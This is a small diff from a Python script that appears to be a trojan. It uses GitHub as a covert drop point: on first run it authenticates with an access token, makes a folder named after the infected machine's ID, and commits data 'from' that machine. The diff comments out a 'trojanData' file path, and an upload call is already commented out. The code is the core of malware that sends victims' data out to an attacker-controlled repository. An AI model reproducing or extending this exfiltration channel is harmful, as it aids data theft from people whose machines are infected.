@@ -90,7 +90,7 @@ if FIRST_RUN == "True":
     FOLDER_PATH = pc_id
     g = Github(ACCESS_TOKEN)
     repo = g.get_repo(REPO_NAME)
-    file_path = "trojanData\\test.txt"
+    # file_path = "trojanData\\test.txt"
     commit_message = f"Added data from {pc_id}"
     create_folder(pc_id,commit_message,BRANCH)
     # upload_file(file_path, commit_message, FOLDER_PATH, BRANCH)
